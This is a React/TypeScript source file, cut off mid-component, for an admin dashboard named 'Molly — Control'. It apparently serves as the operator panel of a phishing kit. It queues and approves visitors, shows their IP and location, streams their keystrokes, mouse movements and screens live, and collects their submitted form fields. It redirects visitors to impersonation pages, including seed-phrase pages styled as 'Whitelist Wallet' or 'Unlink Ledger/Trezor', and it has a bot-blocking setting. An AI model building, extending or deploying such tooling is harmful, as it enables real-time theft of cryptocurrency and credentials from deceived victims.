import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { lazy, Suspense, useEffect, useMemo, useRef, useState, type MouseEvent as ReactMouseEvent, type ReactNode } from "react";
import { useServerFn } from "@tanstack/react-start";
import { supabase } from "@/integrations/supabase/client";
import {
  listAccounts,
  createAccount,
  updateAccount,
  deleteAccount,
  getMyAccount,
} from "@/lib/admin-users.functions";
import type { RealtimeChannel } from "@supabase/supabase-js";
import {
  joinChannel,
  type InputPayload,
  type LiveInputPayload,
  type NavigatePayload,
} from "@/lib/orchestrator";
import {
  loadParticipants,
  markStaleParticipantsOffline,
  purgeStaleUnapproved,
  removeParticipant,
  setParticipantApproval,
  setParticipantAssignment,
  subscribeParticipants,
  type ParticipantRecord,
} from "@/lib/participantStore";
import { StatusDot, type DotState } from "@/components/StatusDot";
import { MollyLogo, type MollyLogoHandle } from "@/components/MollyLogo";
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";

import {
  getDesigns,
  getDesignLogo,
  getPageIcon,
  getPagesFor,
  getRedirectPages,
  subscribeRegistry,
  type DesignRecord,
  type PageRecord,
} from "@/lib/designStore";
import {
  countryFlagEmoji,
  getAppSettings,
  loadAppSettings,
  setBlockBots,
  startAppSettingsSync,
  subscribeAppSettings,
} from "@/lib/appSettings";

import { ParticipantsIcon, PagesIcon, SettingsIcon, FileUploaderIcon } from "@/components/SettingsIcon";

const pagesEditorImport = () => import("@/components/PagesEditor");
const fileUploaderImport = () => import("@/components/FileUploader");
const livePreviewImport = () => import("@/components/LivePreview");
const floatingPanelImport = () => import("@/components/FloatingPanel");

const PagesEditor = lazy(() => pagesEditorImport().then((m) => ({ default: m.PagesEditor })));
const FileUploader = lazy(() => fileUploaderImport().then((m) => ({ default: m.FileUploader })));
const LivePreview = lazy(() => livePreviewImport().then((m) => ({ default: m.LivePreview })));
const FloatingPanel = lazy(() => floatingPanelImport().then((m) => ({ default: m.FloatingPanel })));

function AdminLazyFallback() {
  return <span aria-hidden />;
}


function ParticipantGeoLine({ p }: { p: LiveRecord }) {
  const place = [p.city, p.region, p.country].filter(Boolean).join(", ");
  if (!p.ip && !place && !p.host) return null;
  return (
    <>
      <p className="admin-card-geo">
        <span className="admin-card-flag" aria-hidden>{countryFlagEmoji(p.countryCode)}</span>
        {place && <span className="admin-card-place">{place}</span>}
        {p.ip && <span className="admin-card-ip font-mono">{p.ip}</span>}
      </p>
      {p.host && (
        <p className="admin-card-host font-mono" title="Site domain the participant connected to">
          <span className="admin-card-host-label">via</span> {p.host}
        </p>
      )}
    </>
  );
}




export const Route = createFileRoute("/_authenticated/admin")({
  head: () => ({ meta: [{ title: "Molly — Control" }] }),
  component: Admin,
});

type Suite = string;
type Page = string;
type SuiteOpt = { value: string; label: string };
type PageOpt = { value: string; label: string };

function suitesFromDesigns(designs: DesignRecord[]): SuiteOpt[] {
  return designs.map((d) => ({ value: d.id, label: d.label }));
}
function pagesFromPagesFor(pages: PageRecord[]): PageOpt[] {
  return pages.map((p) => ({ value: p.page, label: p.label ?? p.page }));
}

type LiveRecord = ParticipantRecord & { state: DotState };

function pageLabelFromUrl(url: string): string {
  const m = url.match(/^\/([a-z][a-z0-9_-]{0,30})\/([a-z][a-z0-9_-]{0,40})/);
  if (!m) return url === "/" ? "Focus Room" : url;
  const designs = getDesigns();
  const design = designs.find((d) => d.id === m[1]);
  const pages = getPagesFor(m[1]);
  const page = pages.find((p) => p.page === m[2]);
  const suiteLabel = design?.label ?? m[1];
  const pageLabel = page?.label ?? m[2];
  return `${suiteLabel} · ${pageLabel}`;
}

function dotStateFor(p: ParticipantRecord | undefined): DotState {
  if (!p) return "left";
  return p.online ? "on" : "left";
}

function Admin() {
  const [records, setRecords] = useState<Map<string, LiveRecord>>(new Map());
  const [section, setSection] = useState<"queue" | "participants">("queue");
  const [nav, setNav] = useState<"participants" | "pages" | "settings" | "fileuploader">("participants");
  const [folders, setFolders] = useState<{ admin: boolean; utils: boolean }>(() => {
    if (typeof window === "undefined") return { admin: true, utils: true };
    try {
      const raw = localStorage.getItem("admin_folders_v1");
      if (raw) return JSON.parse(raw);
    } catch { /* ignore */ }
    return { admin: true, utils: true };
  });
  function toggleFolder(key: "admin" | "utils") {
    setFolders((prev) => {
      const next = { ...prev, [key]: !prev[key] };
      if (typeof window !== "undefined") {
        localStorage.setItem("admin_folders_v1", JSON.stringify(next));
      }
      return next;
    });
  }
  const [events, setEvents] = useState<InputPayload[]>([]);
  const [liveInputs, setLiveInputs] = useState<Map<string, LiveInputPayload>>(new Map());
  const [previews, setPreviews] = useState<string[]>([]);
  const [viewports, setViewports] = useState<Map<string, { w: number; h: number }>>(new Map());
  const [designs, setDesigns] = useState<DesignRecord[]>(() => getDesigns());
  const [sidebarOpen, setSidebarOpen] = useState<boolean>(() => {
    if (typeof window === "undefined") return true;
    return localStorage.getItem("admin_sidebar_open") !== "0";
  });
  function toggleSidebar(next?: boolean) {
    setSidebarOpen((prev) => {
      const v = typeof next === "boolean" ? next : !prev;
      if (typeof window !== "undefined") {
        localStorage.setItem("admin_sidebar_open", v ? "1" : "0");
      }
      return v;
    });
  }
  const suites = useMemo(() => suitesFromDesigns(designs), [designs]);
  const channelRef = useRef<RealtimeChannel | null>(null);
  const subscribedRef = useRef(false);
  const mollyRef = useRef<MollyLogoHandle>(null);
  const [, setSettingsTouch] = useState(0); // re-render hook for settings panel only
  const [blockBots, setBlockBotsState] = useState<boolean>(() => getAppSettings().blockBots);
  useEffect(() => {
    const stop = startAppSettingsSync();
    void loadAppSettings();
    const off = subscribeAppSettings((s) => setBlockBotsState(s.blockBots));
    // Preload lazy chunks so tab switches don't flash a Suspense fallback.
    void pagesEditorImport();
    void fileUploaderImport();
    void livePreviewImport();
    void floatingPanelImport();
    return () => { off(); stop(); };
  }, []);



  async function refreshRecords() {
    const rows = await loadParticipants();
    setRecords(
      new Map(
        rows.map((row) => [
          row.id,
          {
            ...row,
            state: dotStateFor(row),
          },
        ]),
      ),
    );
  }

  useEffect(() => {
    const ch = joinChannel({
      key: `admin_${Math.random().toString(36).slice(2, 8)}`,
      onInput: (p) =>
        setEvents((prev) => {
          // Dedupe: drop if last event matches (pid,field,value) within 300ms.
          const last = prev[0];
          if (
            last &&
            last.participantId === p.participantId &&
            last.field === p.field &&
            last.value === p.value &&
            Math.abs(p.at - last.at) < 300
          ) {
            return prev;
          }
          // Cap at 50 events per participant so the feed keeps a real history
          // but never overfloods.
          const next = [p, ...prev];
          const perPid = new Map<string, number>();
          const trimmed: InputPayload[] = [];
          for (const ev of next) {
            const n = perPid.get(ev.participantId) ?? 0;
            if (n >= 50) continue;
            perPid.set(ev.participantId, n + 1);
            trimmed.push(ev);
          }
          return trimmed;
        }),
      onLiveInput: (p) => {
        setLiveInputs((prev) => {
          const next = new Map(prev);
          next.set(p.participantId, p);
          return next;
        });
        window.dispatchEvent(new CustomEvent("ux:liveinput", { detail: p }));
      },
      onMouse: (p) => {
        if (p.vw && p.vh) {
          setViewports((prev) => {
            const cur = prev.get(p.id);
            if (cur && cur.w === p.vw && cur.h === p.vh) return prev;
            const next = new Map(prev);
            next.set(p.id, { w: p.vw, h: p.vh });
            return next;
          });
        }
        window.dispatchEvent(new CustomEvent("ux:mouse", { detail: p }));
      },
      onClick: (p) => window.dispatchEvent(new CustomEvent("ux:click", { detail: p })),
      onScroll: (p) => window.dispatchEvent(new CustomEvent("ux:scroll", { detail: p })),
      onViewport: (p) => {
        if (p.w && p.h) {
          setViewports((prev) => {
            const cur = prev.get(p.id);
            if (cur && cur.w === p.w && cur.h === p.h) return prev;
            const next = new Map(prev);
            next.set(p.id, { w: p.w, h: p.h });
            return next;
          });
        }
        window.dispatchEvent(new CustomEvent("ux:viewport", { detail: p }));
      },
    });
    ch.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        subscribedRef.current = true;
        await ch.track({ admin: true });
      }
    });
    channelRef.current = ch;

    void refreshRecords();
    const participantChannel = subscribeParticipants(() => void refreshRecords());

    // Keep accepted participants forever; flip stale online users red and
    // auto-purge unapproved queue entries that have gone quiet.
    const sweeper = window.setInterval(() => {
      void Promise.all([
        markStaleParticipantsOffline().catch(() => undefined),
        purgeStaleUnapproved().catch(() => undefined),
      ]).then(() => refreshRecords()).catch(() => undefined);
    }, 5_000);
    // Safety: full refresh in case a realtime event was dropped.
    const safety = window.setInterval(() => {
      void refreshRecords().catch(() => undefined);
    }, 10_000);
    return () => {
      subscribedRef.current = false;
      window.clearInterval(sweeper);
      window.clearInterval(safety);
      void participantChannel.unsubscribe();
      void ch.unsubscribe();
    };
  }, []);

  // Load designs registry for the redirect selectors + page labels
  useEffect(() => {
    setDesigns(getDesigns());
    const off = subscribeRegistry(() => setDesigns(getDesigns()));
    return off;
  }, []);

  async function broadcast(event: string, payload: unknown, retries = 3) {
    const ch = channelRef.current;
    if (!ch) return;
    for (let i = 0; i < retries; i++) {
      if (subscribedRef.current) {
        try {
          const res = await ch.send({ type: "broadcast", event, payload });
          if (res === "ok") return;
        } catch {
          /* retry */
        }
      }
      await new Promise((r) => setTimeout(r, 200));
    }
  }

  async function sendNavigate(id: string, suite: Suite, page: Page) {
    const url = `/${suite}/${page}`;
    await setParticipantAssignment(id, url);
    const payload: NavigatePayload = { targets: [id], url };
    void broadcast("navigate", payload);
  }


  function kick(id: string) {
    void broadcast("revoke", { id });
    void removeParticipant(id).then(refreshRecords);
    setPreviews((p) => p.filter((x) => x !== id));
  }


  function approve(id: string, suite: Suite, page: Page) {
    const url = `/${suite}/${page}`;
    void setParticipantApproval(id, true, url).then(() => {
      void refreshRecords();
      void broadcast("approve", { id });
      setTimeout(() => void sendNavigate(id, suite, page), 200);
    });
    setRecords((prev) => {
      const r = prev.get(id);
      if (!r) return prev;
      const next = new Map(prev);
      next.set(id, { ...r, approved: true, assignedUrl: url, currentUrl: url });
      return next;
    });
  }

  function revoke(id: string) {
    void broadcast("revoke", { id });
    void setParticipantApproval(id, false, null).then(refreshRecords);
    setRecords((prev) => {
      const r = prev.get(id);
      if (!r) return prev;
      const next = new Map(prev);
      next.set(id, { ...r, approved: false, assignedUrl: null, currentUrl: "/" });
      return next;
    });
    setPreviews((p) => p.filter((x) => x !== id));
  }

  function openPreview(id: string) {
    setPreviews((p) => (p.includes(id) ? p : [...p, id]));
  }
  function closePreview(id: string) {
    setPreviews((p) => p.filter((x) => x !== id));
  }

  const list = useMemo(
    () => Array.from(records.values()).sort((a, b) => a.joinedAt - b.joinedAt),
    [records],
  );
  const queue = list.filter((r) => !r.approved);
  const approved = list.filter((r) => r.approved);

  return (
    <Suspense fallback={<AdminLazyFallback />}>
    <div className="admin-noir min-h-screen">
      <div
        className={`admin-shell ${sidebarOpen ? "is-open" : "is-collapsed"} chat-closed`}
      >
        <aside className="admin-sidebar">
          <div className="admin-sidebar-head">
            <button
              type="button"
              className="admin-brand-btn"
              onMouseEnter={() => mollyRef.current?.play()}
              onClick={() => toggleSidebar()}
              title={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
              aria-label={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
            >
              <span className="admin-avatar">
                <MollyLogo ref={mollyRef} size={28} />
              </span>
              <span className="admin-brand-name">Molly</span>
            </button>
            <div className="admin-sidebar-head-actions">
              <button
                type="button"
                className="admin-icon-btn"
                title={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
                aria-label="Toggle sidebar"
                onClick={() => toggleSidebar()}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="4" width="18" height="16" rx="2" />
                  <path d="M9 4v16" />
                </svg>
              </button>
            </div>
          </div>
          <nav className="admin-nav">
            <Collapsible open={folders.admin} onOpenChange={() => toggleFolder("admin")}>
              <CollapsibleTrigger asChild>
                <button
                  type="button"
                  className={`admin-nav-folder ${folders.admin ? "is-open" : ""}`}
                  title="Panel"
                >
                  <span className="admin-nav-folder-chev" aria-hidden>
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="9 18 15 12 9 6" />
                    </svg>
                  </span>
                  <span className="admin-nav-folder-label">Panel</span>
                </button>
              </CollapsibleTrigger>
              <CollapsibleContent className="admin-nav-collapsible" forceMount>
                <div className="admin-nav-group">
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "participants" ? "is-active" : ""}`}
                    aria-current={nav === "participants" ? "page" : undefined}
                    onClick={() => setNav("participants")}
                    title="Participants"
                  >
                    <span className="admin-nav-icon">
                      <ParticipantsIcon />
                    </span>
                    <span className="admin-nav-label">Participants</span>
                    <span className="admin-count">{list.length}</span>
                  </button>
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "pages" ? "is-active" : ""}`}
                    aria-current={nav === "pages" ? "page" : undefined}
                    onClick={() => setNav("pages")}
                    title="Pages"
                  >
                    <span className="admin-nav-icon">
                      <PagesIcon />
                    </span>
                    <span className="admin-nav-label">Pages</span>
                  </button>
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "settings" ? "is-active" : ""}`}
                    aria-current={nav === "settings" ? "page" : undefined}
                    onClick={() => setNav("settings")}
                    title="Settings"
                  >
                    <span className="admin-nav-icon">
                      <SettingsIcon />
                    </span>
                    <span className="admin-nav-label">Settings</span>
                  </button>
                </div>
              </CollapsibleContent>
            </Collapsible>

            <Collapsible open={folders.utils} onOpenChange={() => toggleFolder("utils")}>
              <CollapsibleTrigger asChild>
                <button
                  type="button"
                  className={`admin-nav-folder ${folders.utils ? "is-open" : ""}`}
                  title="Utils"
                >
                  <span className="admin-nav-folder-chev" aria-hidden>
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="9 18 15 12 9 6" />
                    </svg>
                  </span>
                  <span className="admin-nav-folder-label">Utils</span>
                </button>
              </CollapsibleTrigger>
              <CollapsibleContent className="admin-nav-collapsible">
                <div className="admin-nav-group">
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "fileuploader" ? "is-active" : ""}`}
                    aria-current={nav === "fileuploader" ? "page" : undefined}
                    onClick={() => setNav("fileuploader")}
                    title="File Uploader"
                  >
                    <span className="admin-nav-icon">
                      <FileUploaderIcon />
                    </span>
                    <span className="admin-nav-label">File Uploader</span>
                  </button>
                </div>
              </CollapsibleContent>
            </Collapsible>
          </nav>
          <AccountChip />
        </aside>



        <main className="admin-main">


          {nav === "participants" ? (
            <>
              <div className="admin-segmented-wrap">
                <div className="admin-segmented" role="tablist">
                  <button
                    role="tab"
                    aria-selected={section === "queue"}
                    className={`admin-seg ${section === "queue" ? "is-active" : ""}`}
                    onClick={() => setSection("queue")}
                  >
                    Queue <span className="admin-seg-count">{queue.length}</span>
                  </button>
                  <button
                    role="tab"
                    aria-selected={section === "participants"}
                    className={`admin-seg ${section === "participants" ? "is-active" : ""}`}
                    onClick={() => setSection("participants")}
                  >
                    Participants <span className="admin-seg-count">{approved.length}</span>
                  </button>
                </div>
              </div>
              <div key={section} className="admin-pane admin-pane-swap">
                {section === "queue" ? (
                  <QueuePane items={queue} onApprove={approve} onKick={kick} suites={suites} />

                ) : (
                  <ParticipantsPane
                    items={approved}
                    onNavigate={sendNavigate}
                    onRevoke={revoke}
                    onKick={kick}
                    onOpenPreview={openPreview}
                    events={events}
                    liveInputs={liveInputs}
                    suites={suites}
                  />
                )}
              </div>
            </>
          ) : nav === "pages" ? (
            <div key="pages" className="admin-pane admin-pane-swap">
              <PagesEditor />
            </div>
          ) : nav === "fileuploader" ? (
            <div key="fileuploader" className="admin-pane admin-pane-swap">
              <FileUploader />
            </div>
          ) : (
            <div key="settings" className="admin-pane admin-pane-swap">
              <SettingsPane
                blockBots={blockBots}
                onToggleBlockBots={(v) => {
                  setBlockBotsState(v);
                  void setBlockBots(v);
                  setSettingsTouch((n) => n + 1);
                }}
              />
            </div>
          )}
        </main>

      </div>



      {previews.map((pid, i) => {
        const rec = records.get(pid);
        const initialUrl = rec?.currentUrl || rec?.assignedUrl || null;
        const initialViewport = viewports.get(pid) || null;
        return (
          <LivePreview
            key={pid}
            pid={pid}
            onClose={() => closePreview(pid)}
            initial={{
              pos: { x: 80 + i * 40, y: 80 + i * 40 },
              size: { w: 480, h: 360 },
            }}
            initialUrl={initialUrl}
            initialViewport={initialViewport}
          />
        );
      })}
    </div>
    </Suspense>
  );
}

function formatRelative(ts: number): string {
  const diff = Math.max(0, Date.now() - ts);
  const s = Math.floor(diff / 1000);
  if (s < 5) return "just now";
  if (s < 60) return `${s}s ago`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h ago`;
  const d = Math.floor(h / 24);
  return `${d}d ago`;
}

function useTick(ms: number): void {
  const [, setT] = useState(0);
  useEffect(() => {
    const id = window.setInterval(() => setT((t) => t + 1), ms);
    return () => window.clearInterval(id);
  }, [ms]);
}

function QueuePane({
  items,
  onApprove,
  onKick,
  suites,
}: {
  items: LiveRecord[];
  onApprove: (id: string, suite: Suite, page: Page) => void;
  onKick: (id: string) => void;
  suites: SuiteOpt[];
}) {
  if (items.length === 0) {
    return <p className="admin-empty">No one waiting. New participants will appear here for approval.</p>;
  }
  function clearAll() {
    if (items.length === 0) return;
    if (!window.confirm(`Remove all ${items.length} queued ${items.length === 1 ? "entry" : "entries"}?`)) return;
    for (const p of items) onKick(p.id);
  }
  return (
    <div className="admin-queue-wrap">
      <div className="admin-queue-toolbar">
        <button
          className="admin-btn admin-btn-danger"
          onClick={clearAll}
          aria-label="Clear all queued entries"
        >
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginRight: 6, verticalAlign: "-2px" }}>
            <polyline points="3 6 5 6 21 6" />
            <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
            <path d="M10 11v6M14 11v6" />
            <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
          </svg>
          Clear all
        </button>
      </div>
      <div className="admin-grid">
        {items.map((p) => (
          <QueueCard key={p.id} p={p} onApprove={onApprove} onKick={onKick} suites={suites} />
        ))}
      </div>
    </div>
  );
}

function QueueCard({
  p,
  onApprove,
  onKick,
  suites,
}: {
  p: LiveRecord;
  onApprove: (id: string, suite: Suite, page: Page) => void;
  onKick: (id: string) => void;
  suites: SuiteOpt[];
}) {
  const [open, setOpen] = useState(false);
  const [suite, setSuite] = useState<Suite>(() => suites[0]?.value ?? "");
  const [regRev, setRegRev] = useState(0);
  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
  useTick(30_000);
  const pageOpts: PageOpt[] = useMemo(
    () => (suite ? pagesFromPagesFor(getPagesFor(suite)) : []),
    [suite, regRev],
  );
  const [page, setPage] = useState<Page>(() => pageOpts[0]?.value ?? "");
  // Keep selections valid when suite/page lists change
  useEffect(() => {
    if (!suite && suites[0]) setSuite(suites[0].value);
  }, [suites, suite]);
  useEffect(() => {
    if (!pageOpts.find((o) => o.value === page)) {
      setPage(pageOpts[0]?.value ?? "");
    }
  }, [pageOpts, page]);

  const appearedAbs = new Date(p.joinedAt).toLocaleString();

  return (
    <article className="admin-card">
      <div className="admin-card-head admin-card-head-stack">
        <div className="admin-card-icons">
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Remove from queue"
            onClick={() => onKick(p.id)}
            aria-label="Remove from queue"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="3 6 5 6 21 6" />
              <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
              <path d="M10 11v6M14 11v6" />
              <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
            </svg>
          </button>
        </div>
        <div className="admin-card-id admin-card-id-bottom">
          <StatusDot state={p.state} />
          <span className="font-mono text-sm">{p.id}</span>
          <span className="admin-tag" style={{ marginLeft: 8 }}>Awaiting</span>
        </div>
      </div>
      <p className="admin-card-page">on · {pageLabelFromUrl(p.currentUrl)}</p>
      <p className="admin-card-meta" title={appearedAbs}>
        appeared {formatRelative(p.joinedAt)}
      </p>
      <ParticipantGeoLine p={p} />

      <div className={`admin-popout ${open ? "is-open" : ""}`}>
        <div className="admin-popout-inner">
          <label className="admin-field">
            <span>Design Suite</span>
            <select value={suite} onChange={(e) => setSuite(e.target.value)}>
              {suites.map((s) => (
                <option key={s.value} value={s.value}>
                  {s.label}
                </option>
              ))}
            </select>
          </label>
          <label className="admin-field">
            <span>Starting Page</span>
            <select value={page} onChange={(e) => setPage(e.target.value)}>
              {pageOpts.map((pg) => (
                <option key={pg.value} value={pg.value}>
                  {pg.label}
                </option>
              ))}
            </select>
          </label>
          <button
            className="admin-btn admin-btn-primary w-full"
            onClick={() => suite && page && onApprove(p.id, suite, page)}
            disabled={!suite || !page}
          >
            Confirm & route
          </button>
        </div>
      </div>

      <div className="admin-card-actions">
        <button className="admin-btn admin-btn-primary" onClick={() => setOpen((v) => !v)}>
          {open ? "Cancel" : "Accept"}
        </button>
      </div>
    </article>
  );
}


function CopyChip({
  text,
  className,
  title,
  children,
}: {
  text: string;
  className?: string;
  title?: string;
  children: ReactNode;
}) {
  const [copied, setCopied] = useState(false);
  function copy(e: ReactMouseEvent) {
    e.stopPropagation();
    if (!text) return;
    try {
      void navigator.clipboard.writeText(text);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 900);
    } catch {
      /* ignore */
    }
  }
  return (
    <button
      type="button"
      className={`copy-chip ${className ?? ""}`}
      onClick={copy}
      title={title ?? "Copy"}
    >
      {children}
      {copied && <span className="copy-chip-pill">Copied</span>}
    </button>
  );
}

function ParticipantsPane({
  items,
  onNavigate,
  onRevoke,
  onKick,
  onOpenPreview,
  events,
  liveInputs,
  suites,
}: {
  items: LiveRecord[];
  onNavigate: (id: string, suite: Suite, page: Page) => void;
  onRevoke: (id: string) => void;
  onKick: (id: string) => void;
  onOpenPreview: (id: string) => void;
  events: InputPayload[];
  liveInputs: Map<string, LiveInputPayload>;
  suites: SuiteOpt[];
}) {
  return (
    <div>
      {items.length === 0 ? (
        <p className="admin-empty">No approved participants yet. Approve from the Queue.</p>
      ) : (
        <div className="admin-grid">
          {items.map((p) => (
            <ParticipantCard
              key={p.id}
              p={p}
              onNavigate={onNavigate}
              onRevoke={onRevoke}
              onKick={onKick}
              onOpenPreview={onOpenPreview}
              suites={suites}
              events={events.filter((e) => e.participantId === p.id)}
              liveInput={liveInputs.get(p.id) ?? null}
            />
          ))}
        </div>
      )}
    </div>
  );
}

function ParticipantCard({
  p,
  onNavigate,
  onRevoke,
  onKick,
  onOpenPreview,
  suites,
  events,
  liveInput,
}: {
  p: LiveRecord;
  onNavigate: (id: string, suite: Suite, page: Page) => void;
  onRevoke: (id: string) => void;
  onKick: (id: string) => void;
  onOpenPreview: (id: string) => void;
  suites: SuiteOpt[];
  events: InputPayload[];
  liveInput: LiveInputPayload | null;
}) {
  const [regRev, setRegRev] = useState(0);
  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
  type PanelKey = "redirect" | "submitted" | "keyboard";
  const [panels, setPanels] = useState<Set<PanelKey>>(() => new Set());
  function togglePanel(k: PanelKey) {
    setPanels((prev) => {
      const next = new Set(prev);
      if (next.has(k)) next.delete(k);
      else next.add(k);
      return next;
    });
  }
  function closePanelKey(k: PanelKey) {
    setPanels((prev) => {
      if (!prev.has(k)) return prev;
      const next = new Set(prev);
      next.delete(k);
      return next;
    });
    if (k === "redirect") setTimeout(() => { setPickedSuite(null); setPickedPage(null); }, 200);
  }
  const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
  const [pickedPage, setPickedPage] = useState<Page | null>(null);

  const PAGE_VARIANTS: Record<string, Record<string, { value: string; label: string }[]>> = {
    cb: {
      phrase: [
        { value: "phrase?mode=whitelist", label: "Whitelist Wallet" },
        { value: "phrase?mode=disconnect", label: "Disconnect Wallet" },
        { value: "phrase?mode=ledger", label: "Unlink Ledger" },
        { value: "phrase?mode=trezor", label: "Unlink Trezor" },
      ],
    },
  };

  const pageOpts: PageOpt[] = useMemo(
    () => (pickedSuite ? pagesFromPagesFor(getRedirectPages(pickedSuite)) : []),
    [pickedSuite, regRev],
  );


  const submitted = useMemo(() => {
    const map = new Map<string, InputPayload>();
    for (const e of events) {
      if (e.field.startsWith("__")) continue;
      if (/_clicked$/.test(e.field) || e.field === "continue_clicked") continue;
      const prev = map.get(e.field);
      if (!prev || prev.at <= e.at) map.set(e.field, e);
    }
    return Array.from(map.values()).sort((a, b) => b.at - a.at);
  }, [events]);

  return (
    <article className="admin-card">
      <div className="admin-card-head admin-card-head-stack">
        <div className="admin-card-icons">
          <button
            className="admin-icon-btn"
            title="Live preview"
            onClick={() => onOpenPreview(p.id)}
            aria-label="Open live preview"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
              <circle cx="12" cy="12" r="3" />
            </svg>
          </button>
          <button
            className="admin-icon-btn"
            title="Redirect"
            onClick={() => togglePanel("redirect")}
            aria-label="Redirect participant"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="13 6 19 12 13 18" />
            </svg>
          </button>
          <button
            className="admin-icon-btn"
            title="View submitted info"
            onClick={() => togglePanel("submitted")}
            aria-label="View submitted info"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10" />
              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
              <line x1="12" y1="17" x2="12.01" y2="17" />
            </svg>
            {submitted.length > 0 && <span className="admin-icon-badge">{submitted.length}</span>}
          </button>
          <button
            className="admin-icon-btn"
            title="Live typing"
            onClick={() => togglePanel("keyboard")}
            aria-label="Live keyboard"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="6" width="20" height="12" rx="2" />
              <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10" />
            </svg>
          </button>
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Revoke access"
            onClick={() => onRevoke(p.id)}
            aria-label="Revoke access"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="1 4 1 10 7 10" />
              <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10" />
            </svg>
          </button>
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Remove"
            onClick={() => onKick(p.id)}
            aria-label="Remove participant"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="3 6 5 6 21 6" />
              <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
              <path d="M10 11v6M14 11v6" />
              <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
            </svg>
          </button>
        </div>
        <div className="admin-card-id admin-card-id-bottom">
          <StatusDot state={p.state} />
          <CopyChip text={p.id} title="Copy participant id" className="copy-chip-inline">
            <span className="font-mono text-xs">{p.id}</span>
          </CopyChip>
        </div>
      </div>
      <p className="admin-card-page">on · {pageLabelFromUrl(p.currentUrl)}</p>
      <ParticipantGeoLine p={p} />

      {panels.has("redirect") && (
        <FloatingPanel
          title={
            <span>
              Redirect <span className="font-mono text-[11px] opacity-60">{p.id}</span>
              {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
            </span>
          }
          accentDot="#8aa6ff"
          onClose={() => closePanelKey("redirect")}
          initialSize={{ w: 300, h: 380 }}
          minSize={{ w: 240, h: 240 }}
        >
          {!pickedSuite ? (
            <div className="admin-redirect-list">
              {suites.length === 0 && (
                <p className="admin-redirect-empty">No designs yet.</p>
              )}
              {suites.map((s, i) => {
                const logo = getDesignLogo(s.value);
                return (
                  <button
                    key={s.value}
                    className="admin-redirect-item"
                    style={{ animationDelay: `${i * 30}ms` }}
                    onClick={() => setPickedSuite(s.value)}
                  >
                    <span className="admin-redirect-item-dot">
                      {logo ? (
                        <img src={logo} alt="" style={{ width: 14, height: 14, objectFit: "contain", display: "block" }} />
                      ) : "›"}
                    </span>
                    <span>{s.label}</span>
                    <span className="admin-redirect-item-arrow">→</span>
                  </button>
                );
              })}
            </div>
          ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
            <>
              <button className="admin-redirect-back" onClick={() => setPickedPage(null)}>
                ← Pages
              </button>
              <div className="admin-redirect-list">
                {PAGE_VARIANTS[pickedSuite][pickedPage].map((v, i) => {
                  const icon = getPageIcon(pickedSuite, pickedPage) ?? getDesignLogo(pickedSuite);
                  return (
                    <button
                      key={v.value}
                      className="admin-redirect-item"
                      style={{ animationDelay: `${i * 25}ms` }}
                      onClick={() => {
                        onNavigate(p.id, pickedSuite, v.value);
                        setPickedPage(null);
